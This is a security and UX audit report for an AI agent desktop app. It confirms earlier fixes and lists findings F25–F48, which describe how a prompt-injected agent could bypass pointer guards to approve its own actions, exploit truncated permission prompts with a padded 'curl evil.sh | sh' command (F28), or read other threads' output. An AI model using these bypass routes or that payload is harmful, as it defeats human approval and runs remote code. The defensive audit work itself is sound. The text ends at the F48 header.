# Findings — kimi-k3 pass 2, 2026-08-01

## Summary

Pass 2 per `docs/audits/AUDIT-BRIEF-kimi-k3-pass2.md`: user experience and friction first, human-facing security second. Method: twelve parallel read-only sub-audits (five fix-verification, six UX journeys, one consent/labelling sweep) plus a live CLI probe, each citing `file:line`; the two highest-impact new claims were re-verified by hand against the code. Working tree clean at `d3767a1`. `go vet` clean, `go test ./...` all green, `ctest` 13/13.

The pass-1 fixes hold up unusually well: 22 of 24 findings fully CLOSED, several fixed better than the sketches (F15's refusal-PNG, F19 fixed at the source, F1's facts-first approval prompt). Both OPEN Cowork items are CONFIRMED — item 1 is worse than scoped (the pointer guard itself, not just the mirror commit, is defeated by overlapping motion inside a single call); remediation plans are in F25/F26. The live question is answered: claude's `acceptEdits` does **not** auto-accept Edit/Write outside the session cwd (probe details under the verification table).

The new findings concentrate where the brief predicted: the overlap of UX and security. The four that matter most: (1) a one-off "Approve" on kimi can silently become `allow_always` (and "Deny" `reject_always`) — a standing grant the human never saw offered (F27); (2) the highest-frequency prompt in the product truncates Bash commands at 240 chars with no way to read the rest before approving, and the truncation point is attacker-controllable (F28); (3) "Discard changes" on a workspace-mode agent wipes the user's *own* uncommitted work under an agent-scoped label (F29); (4) the UI calls git worktrees a "sandbox" while the security model explicitly says they are not one (F30). On the pure UX side: live subagent text has never been painted (dead since it shipped, F39), tool errors render identically to successes (F40), and the first-run CLI-missing dead end only surfaces after the user has written and sent their first task (F37).

## Pass-1 verification table

| ID | Title (short) | Verdict | Note |
|---|---|---|---|
| F1 | `launch_agent` ungated workers | CLOSED | Caller bound to parent; rank/effective-isolation/restriction-shed measured vs parent → human prompt with real facts (facts-first within the 240-char budget, attacker text last); reservation caps 8/parent, 24/tree; workers inherit DisallowedTools/AddDirs/StrictMCPConfig/MaxBudgetUSD; alternate routes (fork/resume/promote/setOption/mode.save/Env) all gated; unknown requested modes rank above everything (always prompts), approvals never cached |
| F2 | World-readable stores | CLOSED | 0700/0600 at all write sites + fail-closed migration on every open; env redaction (key-shape + value-shape) on disk and wire; live `stat` confirms; `skills/` 0755 residual sealed by 0700 root |
| F3 | Keyboard self-target guard | CLOSED | Fail-closed `resolveInjectTarget` matrix + fatal post-consent focus re-verify + timed-span focus watch, on both keyboard paths and `playInput`; UI-side abort on AgentKate focus; dialog: ReturnGuard eats Enter, Deny default, Allow needs exact phrase + separate activation |
| F4 | Cleanup `RemoveAll` fallback | CLOSED | `VerifyProvenance` (containment + no symlink components + git-registered, fail-closed) in analyser, `Remove`, and again immediately before the `RemoveAll` fallback; BLOCKED rows uncheckable; no provenance-skipping RPC found |
| F5 | `agent.start` no role check | CLOSED | `requireUI` on start/resume/fork/promote/setOption/mode.save/mode.delete/mode.apply/attach; cowork flag single funnel (`authorizeCoworkAtStart`); no agent-reachable Env path remains |
| F6 | Broadcast leaks | CLOSED (push) — residue → F34 | `permission.respond` UI-gated; `permission.requested`/`agent.event`/all cowork notifications `NotifyUI`; race dead. The same data class survives via unauthenticated **pull** endpoints — filed as F34 |
| F7 | a11y self-target fail-open | CLOSED | PID evidence decisive (`IsSelfPID` first); PID≤0 / list error / unresolved owner / self-window all refuse; wired before consent in both R2 paths; pointer-click-element still backed by the geometric guard |
| F8 | Silent a11y flip | CLOSED | Disclosed by all causing paths (enable, preflight, agent dialog, R2 dialog, browser button); applied only after the portal grant lands; restored on decline/kill-switch/last-agent-off/exit/next-run recovery |
| F9 | stdin write under `t.mu` | CLOSED | `writeFrame` under dedicated `wmu` (never held with `mu`), 30 s deadline, `writeBroken` latch, state rollback on error; test-pinned |
| F10 | Unbounded replay / store growth | CLOSED | Replay capped 4000 events / 8 MiB at reader and handler; kimi logs trimmed 32→8 MiB and deleted on all three destroy paths; archive 500 recs / 4 MiB; cowork-audit rotates at 8 MiB. Residual: some own-store reads without pre-size check inside the 0700 root — same-uid hygiene, informational |
| F11 | Attachment read-before-check | CLOSED | `QFileInfo::size()` gate before open; capped reads everywhere; no `readAll` remains; test-pinned |
| F12 | Sync D-Bus on GUI thread | CLOSED | The D-Bus code is gone from `BrowserLaunch.cpp` entirely — the a11y flip moved to CoworkPortal's async path; comment at `BrowserLaunch.cpp:211-215` cites F8/F12 |
| F13 | Unauthenticated socket roles | CLOSED (as claimed) | Single-claim UI role atomic under one lock (the old race is described in a comment and dead); per-bridge secrets env-delivered, replay-gated, fail-closed on nil ledger; residuals (pre-UI first claim, same-uid `/proc` read) documented and fail-noisy |
| F14 | `openUrl` any scheme | CLOSED | All model-controlled paths route through `openModelLink` (http/https/mailto direct; else confirm dialog with real target, default Cancel); remaining `openUrl` sites are user-picked local files |
| F15 | QTextBrowser local images | CLOSED | `GuardedTextBrowser`/`GuardedTextDocument` on every render path incl. selection overlay and painted rows; canonical-root check + regular-file check + byte cap; refusal serves a 1×1 PNG so Qt never re-opens the path (the false-premise class handled explicitly); source-scan test |
| F16 | Markdown fence desync | CLOSED | Hand-rolled neutralizer deleted; single `setMarkdown` call site with `MarkdownNoHTML`; tests drive the real md4c pipeline; source scan fails the build on any other `setMarkdown` |
| F17 | Handler ctx leak | CLOSED | Per-connection `connCtx` cancelled first in teardown; `dispatch` uses it; `TurnTracker.Wait` releases on `ctx.Done()` |
| F18 | Per-paint doc rebuilds | CLOSED | Tool detail/result docs cached keyed on (stableId, width, text, font) with correct invalidation; thumbnails memoised with re-stat drop; chips laid out once per pass |
| F19 | `_usage` dropped / mis-billed | CLOSED | Fixed at the source: kimi emits `_context`, never `_usage`, and never ships cumulative `usage.input_tokens`; belt-and-braces UI guard on `usageReporting`; test-pinned |
| F20 | `/tmp` fallbacks | CLOSED | Private 0700 per-user dir (own-uid, non-symlink, fail-closed) asserted *before* bind; modes fallback private + O_EXCL\|O_NOFOLLOW; UI side mirrors the discipline |
| F21 | `Qt::AutoText` labels | CLOSED | `Qt::PlainText` pinned on all four sites plus form keys |
| F22 | Stuck busy cursor | CLOSED | Hold/release pair + destructor release behind `m_cursorHeld` |
| F23 | Persona in argv | CLOSED | Persona → 0600 temp file via `--append-system-prompt-file` (fail-closed); residuals documented: old-CLI argv fallback, `--agents` (live-probed: no file form exists on claude 2.1.220) |
| F24 | Grouped smaller items | MOSTLY CLOSED | 12 of 18 closed (debug gated behind `AKCORE_DEBUG`; MCP line reader resyncs; compact unique tmp; TurnFailed deferral; kimi replay json.Valid; orch grants 15-min sliding TTL; reaper drain-before-Wait; vsix O_NOFOLLOW+caps; notification pooling; QPointer controllers; KWin shot 30 s backstop; policy-derived dialog sentence). UNFIXED, all low: PATH pinning, input-injection cross-call rate limit, relay 5× parse, sync-callback contract comment, find-highlight cache, kimi skill-reload note — carried into F50. `screencast`/`vd_sandbox` toggles elevated to F32 |
| OPEN-1 | `playInput` FinalPos bypass | CONFIRMED → F25 | Confirmed and broader than scoped: the guard itself is defeated within one call; remediation plan in F25 |
| OPEN-2 | Per-thread mirror, global cursor | CONFIRMED → F26 | Remediation plan in F26 |
| Live Q | acceptEdits outside cwd | ANSWERED: **NO** | Live probe, claude 2.1.220: inside-cwd write auto-accepted (control), outside-cwd Write refused ("requires permission to write to that path"), outside-cwd Edit refused even earlier at the Read step; `-p` exercises the permission path faithfully. Caveat: user/project `settings.json` `permissions.allow` rules can still permit outside-cwd writes — explicit configuration, not the mode default. Evidence: `/tmp/ak-probe/` |

## Findings

### F25. `playInput`: overlapping pointer motion defeats the submit-time guard *and* poisons the mirror — in a single call (OPEN item 1, confirmed and broadened)
- **Lens:** security
- **Severity:** critical within the consent-gated threat model (last guard on the pointer path; bypass is deterministic); below F1-class in absolute terms — the feature requires explicit human enablement plus a standing toggle · **Confidence:** confirmed (code-traced; not executed live)
- **Where:** `core/cmd/akcore/cowork_timeline.go:259-260,381-388,420-433,481,508`, `core/cmd/akcore/cowork_pointer.go:302-353,46-73,479-491`, `core/cmd/akcore/cowork.go:561-566,627-635,389`, `ui/src/cowork/CoworkPortal.cpp:1884-1900,1741`
- **What:** `buildTimelineOps` threads `lastPos` in *event fire-time order* and sets `plan.FinalPos = lastPos`, but each event's sub-ops are pinned on the absolute timeline at their own `fireAt` and then globally re-sorted — a profiled move expands to up to 240 ops × 12 ms ≈ 2.9 s of flight (no speed floor; per-event `profile` is agent-controlled), so an earlier event's motion extends past a later event's fire-time and the streams interleave. There is no overlap check anywhere in the compiler. Consequences: (a) the handler commits `plan.FinalPos` (event-order-final) while the cursor ends at the last move op in *stream* order — the mirror ends up saying B while the cursor sits at A; (b) worse, the guard itself is defeated in-call: a bare `button`/`click` scheduled while an earlier move is in flight gets a GuardPt from lowering-time `lastPos`, but fires wherever the interleaved stream has the cursor — provably not the guarded point. The guard's whole model assumes sequential motion; the compiler never enforces it.
- **Concrete timeline** (one call, established mirror, `pointer_control` toggle on): `[move→A @0 profile{speed:1}]`, `[move→B @500]`, `[button left @3000]`. A's path lands at t≈2868 ms; B's at t≈860 ms; the click at t=3000 is guarded against B but fires at A. After the call `landed=true` → `setLast(B)`: mirror B, cursor A. A follow-up bare click is then also cleared against B while landing on A. Pointing A at AgentKate's own panel toggles converts this into the self-approval chain F3 closed; targeting coordinates are obtainable via a11y read (F50 item).
- **Preconditions:** prompt-injected agent in a Cowork-enabled thread with the `pointer_control` standing toggle (the advertised "click without asking" switch). Deterministic — no race, no focus timing.
- **Remediation plan:** (1) *Compiler invariant (the fix):* track `motionUntil` = max end-time of any emitted motion path; any pointer op (`move`, `move_rel`, `click`, `scroll`, `button*`) with `fireAt < motionUntil` → compile error (keyboard events exempt — overlapping holds are a feature). This restores event-order == flight-order for motion, making both GuardPts and `FinalPos == lastPos` sound; overlapping absolute motion is never semantically meaningful, so nothing legitimate breaks. (2) *Defence in depth:* derive `FinalPos` by walking the compiled `timed` stream (move → set; move_rel → bounds-checked accumulate) and assert it agrees with `lastPos` under the invariant. (3) *Tests* (none exist for overlap today): overlapping moves → error; bare button during in-flight path → error; positioned click during in-flight path → error; the exact 3-event script above must fail to compile; non-overlapping scripts compile unchanged with `FinalPos` = last target.
- **Effort:** small (~15-line invariant + tests)

### F26. The pointer mirror is per-thread; the cursor is global (OPEN item 2, confirmed)
- **Lens:** security
- **Severity:** high within the threat model (needs two Cowork-enabled threads and two standing grants) · **Confidence:** confirmed (code)
- **Where:** `core/cmd/akcore/cowork_pointer.go:89` (`lastPos map[string]point` keyed by thread), `core/cmd/akcore/cowork.go:343,468,884` (mirror reads), `:665-666` (motion deliberately unguarded)
- **What:** `guardPointerTargets` tests the *mirror point* against live window geometry, never the real cursor (no global cursor read exists on Wayland — that is why the mirror exists). Thread A parks the real cursor over an AgentKate window (motion is unguarded and lands proven, so mirror_A is honestly on-target); thread B's mirror still reads its own earlier clean position; B's bare click via `desktop_inject_input` passes its guard and the portal fires at the global cursor — A's parked point. A cannot do this alone; the bug is precisely that the guard evidence is per-thread while the resource is global. Same hole for B's bare `button`/`scroll` events inside `desktop_play_input`.
- **Preconditions:** two Cowork-enabled threads (common with ensembles); attacker controls both agents' prompts (or one agent + a controller via `launch_agent`); A needs `pointer_control` (toggle or one-time consent), B needs `input_inject` or `pointer_control` standing. No race — calls can be far apart.
- **Remediation plan:** (1) *Global cursor evidence:* key the mirror globally (one "last commanded pointer position" per core), updated/invalidated by every thread's pointer action — A's park then either commits the AgentKate point (B's guard refuses geometrically) or invalidates the mirror (B fails closed). The availability cost (threads invalidate each other) is acceptable; refusal messages already steer to re-establishing position. (2) *Serialize guard→fire:* one mutex held from `guardPointerTargets` through the portal reply for any bare-position-dependent action. (3) *Document the irreducible residue* (physical mouse / non-AgentKate processes moving the cursor between guard and fire) in `docs/security-model.md`. (4) *Tests:* cross-thread move then other-thread bare click → refused; invalidation is global; concurrent bare actions serialize.
- **Effort:** small-medium

### F27. Kimi: a one-off "Approve" can silently become `allow_always`; "Deny" can become `reject_always`
- **Lens:** security
- **Severity:** high · **Confidence:** confirmed (code; re-verified by hand)
- **Where:** `core/internal/kimi/thread.go:1903-1916`
- **What:** The UI offers exactly one-off Approve/Deny. The kimi bridge maps the boolean onto ACP option kinds with a fallback: `want, fallback = "allow_once", "allow_always"` (mirrored for reject). If kimi's option set for a given prompt lacks an `allow_once` kind, the bridge selects `allow_always` — a **standing grant the human never saw offered and the UI never mentions**. Symmetrically, one "Deny" can permanently silence a prompt class via `reject_always`.
- **Why it matters:** the human's model of the interaction ("I allowed this once") diverges from the recorded authority ("always") — precisely the one-off-vs-standing indistinguishability the brief asks about, and it is invisible from every UI surface.
- **Fix sketch:** never fall back across scope. If `allow_once` is absent, answer `cancelled` (fail closed) and note it in the feed; never pick `allow_always` on the user's behalf. If kimi compat truly requires the fallback, surface it in the bar ("this agent only offers allow-always here") before the human decides.
- **Effort:** small

### F28. The permission bar truncates Bash commands at 240 chars with no way to read the rest before approving
- **Lens:** ux+security
- **Severity:** high · **Confidence:** confirmed (code; re-verified by hand)
- **Where:** `ui/src/AgentPanel.cpp:4641-4644`, `ui/src/AgentChatHelpers.cpp:215`; bar construction `AgentPanel.cpp:648-656`
- **What the user experiences:** the single most common prompt in the product shows `summary.left(240) + "…"` — a label plus Deny/Approve, no "Details…" expander, no tooltip with the full text. A command shaped as `<200 innocuous chars>; curl evil.sh | sh` shows a benign prefix and an ellipsis; Approve authorizes the whole string. The truncation point is attacker-controllable (padding is trivial for a prompt-injected agent). The `…` signals truncation, but the only remediation offered is Deny.
- **Fix sketch:** for Bash, elide the *middle* of the command (payloads hide at the tail), and add a "Details…" button showing the full raw input in a scrollable read-only dialog — the data is already client-side in the notification.
- **Effort:** small

### F29. "Discard changes" on a workspace-mode agent wipes the USER'S checkout, labelled as agent-scoped
- **Lens:** ux+security
- **Severity:** high (data loss under a misleading label) · **Confidence:** confirmed (code)
- **Where:** `ui/src/WorktreeDashboard.cpp:287,417-435`, `core/internal/worktree/provenance.go:212-234`, `core/internal/worktree/worktree.go:655-671`, `core/internal/gitstatus/status.go:168-182`
- **What the user experiences:** the Worktree Dashboard lists non-isolated agents. For such a row, `dirtyCount` is the porcelain status of the *user's whole checkout* (their own uncommitted work included); "Discard changes…" is enabled on `dirty > 0` with no isolation check and confirms with "Permanently discard all N uncommitted changes in worktree #3"; the core then runs `git reset --hard HEAD` + `git clean -fd` on the checkout — which `VerifyRunPath` explicitly permits for a direct-workspace record. The user believes "throw away the agent's changes"; what happens is every uncommitted change in their real checkout — theirs included — is destroyed. The dialog says "cannot be undone" but frames the blast radius as agent-scoped; the same dashboard *does* guard "Remove worktree…" with `r->isolated` ("never the shared workspace"), so the asymmetry is inconsistent with the app's own caution.
- **Fix sketch:** disable Discard for non-isolated rows, or branch the dialog to say plainly "this agent works directly in your checkout — this discards ALL uncommitted changes in <path>, including yours."
- **Effort:** small

### F30. The UI calls git worktrees a "sandbox"; the security model explicitly says they are not one
- **Lens:** ux+security
- **Severity:** high (teaches a false safety belief at the decision point) · **Confidence:** confirmed
- **Where:** `ui/src/AgentPanel.cpp:803-812` ("In a private copy (sandbox)", tooltip "always its own sandbox"), `:4438-4439` (promote note), `ui/src/NewAgentDialog.cpp:226-228` vs `docs/security-model.md:11` ("It is **not a sandbox and does not pretend to be one**"), `:21` (same uid)
- **What the user experiences:** the default-on isolation control promises a "sandbox". A worktree isolates *checkout state*, not the process — no filesystem, network, or credential containment; an agent writing absolute paths outside the worktree is invisible to diff/dirty/snapshot, and nothing anywhere detects it. "Sandbox" teaches exactly the false belief the removed `manual` mode taught: supervision/containment the mechanism doesn't deliver. Related divergence: the workspace-mode diff is `git diff HEAD` (tracked only), so escape-writes and new-file creation are doubly invisible (see F41).
- **Fix sketch:** drop "(sandbox)" → "private copy (git worktree)" everywhere (NewAgentDialog's parenthetical is already the honest form — align the rest to it); optionally surface absolute paths outside the worktree in transcript tool cards.
- **Effort:** small

### F31. Enter defaults to the risky action on three authority dialogs
- **Lens:** ux+security
- **Severity:** medium · **Confidence:** confirmed (KMessageBox defaults verified against installed KF6 headers, not assumed: `questionTwoActions` defaults to the PRIMARY action = Enter)
- **Where:** `ui/src/cowork/CoworkPanel.cpp:796-804` (agent-initiated "Allow desktop access" — Enter grants screen-read + type/click-as-you), `:642-655` (a11y flip "Turn it on and continue" — Enter performs a desktop-wide security-relevant change), `ui/src/SessionBrowserDialog.cpp:377-384` ("Forget Session" — Enter permanently deletes a transcript)
- **What the user experiences:** the enable dialog is agent-initiated and long (reason + standing-grant disclosure + a11y disclosure) — exactly the text a tired user skips before hitting the default. The *content* of these dialogs is excellent (live policy, fail-closed); the default button undoes some of that care. Note the app already knows the right pattern: `ControlConsentDialog` (Deny default + ReturnGuard), the SafeContent link dialog (Cancel default), and `CleanupDialog.cpp:614` (`Dangerous` option) all default safe.
- **Fix sketch:** one shared change — pass `KMessageBox::Options(KMessageBox::Notify | KMessageBox::Dangerous)` (moves the default off the primary action) or switch to `warningTwoActions` (default is the safe secondary) on all three.
- **Effort:** small

### F32. Cowork panel ships standing pre-authorization toggles for capabilities no tool implements
- **Lens:** security (absorbs the F24(k) straggler, elevated by the labelling angle)
- **Severity:** medium · **Confidence:** confirmed
- **Where:** `core/internal/cowork/policy.go:149-164` (`AllToggleable` includes `screencast`, `vd_sandbox`), `core/cmd/akcore/mcp_cowork.go:84` ("screencast/sandbox land in v3"), `ui/src/cowork/CoworkPanel.cpp:104-122` ("Watch the screen", "Sandbox desktop" tiles)
- **What:** a policy toggle is a *persisted standing grant* — "allowed for ANY cowork-enabled agent with NO per-action prompt… overrides even the R2 per-action default". But no screencast or sandbox tool exists. These are dead switches whose `cowork-policy.json` entries will silently arm no-prompt grants the day v3 ships — a pre-authorization the user set when the feature didn't exist and will never be re-asked about. Same failure shape as `manual`: a control promising something the mechanism doesn't deliver. Adjacent: "Sandbox desktop" names an organizational boundary as containment (docs are exemplary — "ORGANIZATIONAL, not security" — the UI label is not).
- **Fix sketch:** drop unimplemented capabilities from `AllToggleable()` until their tools land (or render disabled with "coming in a future release"); rename to "Separate desktop" when it ships.
- **Effort:** small

### F33. No single answer to "right now, what can my agents do without me"
- **Lens:** ux+security
- **Severity:** medium · **Confidence:** confirmed
- **Where:** scattered: permission mode per panel (`ui/src/AgentPanel.cpp:781-799`); orch grants in-memory, no list/revoke RPC (`core/cmd/akcore/orchestrate.go:91-109` — the code comment itself cites invisibility as the reason the TTL exists); cooperation authority auto-allowed for every thread (`core/internal/agent/agent.go:172-179`); cowork toggles/grants well-surfaced (`ui/src/cowork/CoworkPanel.cpp:212-228,462-535`) but grant sentences name raw thread ids (`:516-518`) and no view aggregates *which* agents are currently cowork-enabled
- **What the user experiences:** cowork state is consolidated and revocable (genuinely good), but the cooperation authority — every agent may launch/send/wait/close agents and spend money on new workers within its subtree with zero prompts — is shown nowhere as authority; live cross-subtree approvals are invisible and irrevocable while live (mitigated by the 15-min sliding TTL); a toggle flipped Monday silently covers a cowork-enabled agent resumed Thursday.
- **Fix sketch:** a "Permissions" overview (or a section in the Cooperation panel) listing per agent: permission mode, cowork-enabled flag, active cowork grants, live cross-subtree approvals — with revoke where the core supports it; expose `orchestration.listGrants`/`revoke`; resolve thread ids → roster titles in grant sentences.
- **Effort:** medium

### F34. Transcript pull endpoints have no caller check (F6 residue, pull form)
- **Lens:** security
- **Severity:** low-medium · **Confidence:** confirmed (code)
- **Where:** `core/cmd/akcore/handlers.go:478` (`agent.transcript` — full raw transcript of any thread), `:731` (`session.preview` — turns of any discovered CLI session)
- **What:** with the push channels now UI-only (F6 closed), these are the remaining socket path to the same data class (tool inputs, human messages, possible secrets in tool output) — no `requireUI` or any binding, while the UI always handshakes first so the check is free. Reachability caveat: a prompt-injected agent needs code execution to speak raw JSON-RPC (Bash-gated in default modes); but bridges of permissive-mode threads and any local process get cross-thread transcripts with no audit trail.
- **Fix sketch:** `requireUI` on both (dormant replay is already UI-only).
- **Effort:** small

### F35. `wait_agent` waits on ANY thread in-band and returns its last assistant text
- **Lens:** security
- **Severity:** low-medium · **Confidence:** confirmed
- **Where:** `core/cmd/akcore/mcp.go:698-715` (only self-wait refused), `core/cmd/akcore/orchestrate.go:305-342` (no `requireCallerThread`/`authorizeAgentTarget` — unlike `send_agent`/`close_agent`)
- **What:** a prompt-injected agent can harvest the last assistant message of any thread in any workspace (including the human's private threads) into its own context, no human in the chain — a small but genuinely in-band cross-agent read channel, the class `mcpactivity.go` goes out of its way to avoid.
- **Fix sketch:** `requireCallerThread` + `authorizeAgentTarget(from, target, "wait_agent")` in the handler (the grant TTL machinery already exists).
- **Effort:** small

### F36. Privileged handler cluster with no caller binding; `permission.request` threadId unbound
- **Lens:** security
- **Severity:** low (defense-in-depth inconsistency, not a live primitive today) · **Confidence:** confirmed
- **Where:** `core/cmd/akcore/handlers.go:804` (`agent.stop`), `:943` (interrupt), `:974/:993/:1014` (commit/openPR/land — git mutations on another thread's worktree incl. an outward `gh` PR), `:2054` (discardChanges), `:2081` (removeWorktree), `:755` (`session.forget` — deletes CLI transcripts from disk), `:2565` (`cleanup.archiveAndRemove` — destructive), plus `agent.rename`/`setTags`, `vsix.install/uninstall`, `skills.install/uninstall`; `permission.request` at `:1615-1633` accepts caller-chosen `threadId` (dialog spoofing in another thread's panel, request parking)
- **What:** reaching these needs raw socket access, which a gated agent can't get in-band today (the bridge only forwards the fixed MCP tool set) — but it is inconsistent with the boundary the F13 work just built, and becomes live the moment any future in-band tool proxies them. `agent.stop` is the odd one out: `agent.stopClose` got the full binding treatment and `agent.stop` didn't.
- **Fix sketch:** `requireUI` on the cluster; `RequireBridge(ctx, p.ThreadID)` on `permission.request`.
- **Effort:** small

### F37. A missing `claude`/`kimi` CLI is discovered only after the user has written and sent their first task
- **Lens:** ux
- **Severity:** high (the most likely first-run dead end, at the worst moment) · **Confidence:** confirmed
- **Where:** engine picker lists harnesses unconditionally (`core/cmd/akcore/handlers.go:296-302`, `ui/src/state/HarnessTraits.cpp:492-500`); failed discovery probe deliberately swallowed (`HarnessTraits.cpp:294-298`); no `findExecutable` check anywhere in `ui/src`; raw error `core/internal/agent/agent.go:736-738` rendered verbatim at `ui/src/AgentPanel.cpp:3180-3184`; WelcomeDialog silent on the CLI requirement (`ui/src/WelcomeDialog.cpp:133-140`)
- **What the user experiences:** install → open folder → type "fix the login bug" → Enter → `Failed to start agent: start claude: exec: "claude": executable file not found in $PATH`. Nothing before that moment says AgentKate drives an external CLI, which one, or how to install it; the error names no remedy. Secondary: on this fresh-start failure the opening prompt is committed to the feed and not handed back to the composer (only queued follow-ups are restored, `AgentPanel.cpp:6053-6057`) — the user must copy their own message out of the transcript.
- **Fix sketch:** `QStandardPaths::findExecutable` each harness when the welcome dialog is accepted / on core handshake; if none found, persistent `KMessageWidget` (infra exists, `MainWindow.cpp:385-388`) with an install link, and mark unavailable engines in the picker. Restore the opening prompt to the composer on fresh-start failure.
- **Effort:** small

### F38. Simple mode + sandbox-by-default hides the way to get your changes back
- **Lens:** ux
- **Severity:** high (the default configuration strands the agent's output) · **Confidence:** confirmed
- **Where:** sandbox pre-checked "until I approve" (`ui/src/NewAgentDialog.cpp:223-229`); first-run profiles get Simple mode (`ui/src/MainWindow.cpp:1332-1341`) which hides Merge/Commit/Discard from the Agent menu (`:1034-1037,1257-1282`) and the Worktrees panel entirely (`:1359-1364`); the only surviving path is roster right-click → "Merge into local main…" (`ui/src/AgentRoster.cpp:159`)
- **What the user experiences:** the promise "changes don't touch my files until I approve" has no visible approval button. A non-CS user's first successful run ends with "where did my changes go?" — the least technical persona has no way to see the worktree path, review isolation, or get changes back short of asking the agent in chat.
- **Fix sketch:** remove `m_agentMergeAct` from `m_advancedActions` (it is the payoff action, not a developer tool), and/or post a dim sys note when an isolated agent first writes files: "Changes are in a private copy — right-click the agent to review and merge."
- **Effort:** small

### F39. Live subagent text is never painted — the forwarding feature is dead on arrival
- **Lens:** ux
- **Severity:** high (a shipped feature that never worked; long turns sit at "⋯") · **Confidence:** confirmed (code; introduced in `c945893` with the bug present)
- **Where:** pipeline `ui/src/AgentPanel.cpp:5334-5413` (`routeSubagentText`), `:5156-5180` (`flushSubagentText`), `ui/src/TranscriptModel.cpp:154-166` (`setToolProgress` stores partial text without `toolDone` — deliberate), but the delegate only measures/paints the result inside `if (done)` (`ui/src/TranscriptDelegate.cpp:867-875`)
- **What the user experiences:** the Task row sits at "⋯" for the whole subagent run — exactly what the feature's own comment says it prevents. The text is buffered, bounded, coalesced, repainted… and never visible; the real result overwrites it at the end. Side effect: expanding a *running* Bash row shows only input JSON.
- **Fix sketch:** in `layoutRow`'s tool branch, paint the result doc when `!done && !result.isEmpty()` too (optionally dimmed or "⋯"-suffixed).
- **Effort:** small

### F40. Tool errors are indistinguishable from successes in the transcript
- **Lens:** ux
- **Severity:** high · **Confidence:** confirmed
- **Where:** `ui/src/AgentPanel.cpp:5670-5687` (the user-event branch never reads `is_error`; the only read is the turn-level `result` at `:5770`)
- **What the user experiences:** a failed Bash/Read/Edit renders the same ✓ and identical styling as a success. Scanning a long turn for "which tool failed" means expanding every row. Combined with F47 (find doesn't search tool rows), failures are effectively undiscoverable.
- **Fix sketch:** read `b["is_error"]` into a `ToolErrorRole`; paint the header mark ✗ in `negative`, optionally tint the card border.
- **Effort:** small

### F41. "View changes" for a workspace-mode agent reports "has not changed anything yet" when the agent only created new files
- **Lens:** ux
- **Severity:** high (the owner's own reported pain: "where did my code go") · **Confidence:** confirmed
- **Where:** `core/internal/worktree/worktree.go:260-263` (`git diff HEAD` — tracked files only), `ui/src/AgentPanel.cpp:4412-4416`
- **What the user experiences:** a workspace agent that creates a brand-new file produces an empty diff and the UI says "has not changed anything yet" — a false statement. The converse also holds: the shown diff mixes the user's own tracked edits in as if they were the agent's.
- **Fix sketch:** for non-isolated threads include untracked files (`git status --porcelain` + synthesized new-file diffs), or label the view "tracked changes only — new files not shown."
- **Effort:** small-medium

### F42. A KWallet-stored key cannot resume an agent after an app restart
- **Lens:** ux
- **Severity:** medium · **Confidence:** confirmed
- **Where:** `m_startedProviderId` is per-session UI state set only at fresh start (`ui/src/AgentPanel.cpp:3176`); on resume after restart the panel sends no provider override and the core resolves the token only from akcore's env (`core/cmd/akcore/agents.go:219,243-247`); failure text `core/internal/agent/provider.go:124-129` names the provider but never where to fix it (contrast the excellent fresh-start preflight `AgentPanel.cpp:3027-3043`)
- **What the user experiences:** an agent that worked all day on a KWallet key fails to resume tomorrow with "no API credential supplied" — which doesn't explain that the KWallet copy is unreachable on this path or name the dialog that fixes it.
- **Fix sketch:** persist the provider *id* in the restored-panel state (already in the session record's non-secret snapshot) and re-resolve from KWallet on resume, as the same-session path does; point the error at Options ▸ Configure API Providers….
- **Effort:** small-medium

### F43. Rate-limited agents are invisible everywhere except their own header
- **Lens:** ux
- **Severity:** medium · **Confidence:** high on the code path; medium on impact (depends on whether the CLI waits or errors when limited — unverified live)
- **Where:** `m_rateLimitStatus` feeds only the in-panel header chip (`ui/src/AgentPanel.cpp:2523-2558`); roster subtitle deliberately excludes it; no notification on entering a limited state
- **What the user experiences:** with five agents, a rate-limited one keeps showing the green "Working" arc in the roster while parked until quota reset; the user learns only by opening that agent. (The in-panel surfaces themselves are good: chip with window/reset time, feed note "resets at 15:04" on transitions.)
- **Fix sketch:** amber roster subtitle token on non-"allowed" transitions + one coalesced notification.
- **Effort:** small

### F44. The fresh chat feed is a blank box — the one panel the user stares at has no empty state
- **Lens:** ux
- **Severity:** medium · **Confidence:** confirmed
- **Where:** no `addNote` on panel construction (`ui/src/AgentDock.cpp:879-899`); ironically every *secondary* panel has a good empty state (Jobs `ui/src/JobsPanel.cpp:374`, Cooperation, Agent Activity, Cowork, roster)
- **What the user experiences:** first launch lands chat-forward in Simple mode with a completely empty transcript area — no welcome note, no "type below to begin".
- **Fix sketch:** seed one dim sys note: "Describe a task below and press Enter — the agent works in a private copy until you approve its changes." (Also the place to advertise Ctrl+Shift+P — see F50.)
- **Effort:** small

### F45. The prominent "+ New Agent" button bypasses the friendly guided dialog
- **Lens:** ux
- **Severity:** medium · **Confidence:** confirmed
- **Where:** `ui/src/AgentDock.cpp:55-63`, `ui/src/AgentRoster.cpp:367-375` (blank agent created directly) vs the genuinely good guided dialog only on Agent ▸ New Agent (`ui/src/MainWindow.cpp:1216-1220`, `ui/src/NewAgentDialog.cpp:44-94`)
- **What the user experiences:** the biggest, most visible creation control dumps the user into a bare panel with five unlabeled combos; the friendly path ("What should this agent do?", plain-words sandbox) is the hidden one.
- **Fix sketch:** plain click on "+ New Agent" opens the guided dialog; keep the model/engine pre-pick menu as its dropdown.
- **Effort:** small

### F46. The engine picker offers dead provider routes on first run
- **Lens:** ux
- **Severity:** medium · **Confidence:** confirmed
- **Where:** presets seeded unconditionally (`ui/src/ProviderConfig.cpp:30-60`, `ui/src/NewAgentDialog.cpp:82-90`)
- **What the user experiences:** "Which agent?" lists "Claude Code via Fireworks" and "via OpenRouter" with no keys configured — a choice that can never succeed (the abort error itself is well-written, `AgentPanel.cpp:3031-3041`).
- **Fix sketch:** only list routed providers where `hasStoredKey()` or the env var resolves, or suffix "(no API key set)".
- **Effort:** small

### F47. The open-project set is not restored between sessions
- **Lens:** ux
- **Severity:** medium (guaranteed per-session redo for the multi-project power user) · **Confidence:** confirmed
- **Where:** relaunch offers exactly one project (`ui/src/main.cpp:175-191`); dormant agents of other projects return only after manual re-adding (`ui/src/AgentDock.cpp:708-727`); roster expand/filter state also session-only (no KConfig in `AgentRoster`)
- **Fix sketch:** persist `m_projects` and offer "Reopen previous session (N projects)" as the welcome dialog's default action; persist roster expand/tag-filter in `[View]`.
- **Effort:** small-medium

### F48. Find searches only message prose; notes and thinking can't be selected or copied
- **Lens:** ux
- **Severity:** medium · **Confidence:** confirmed
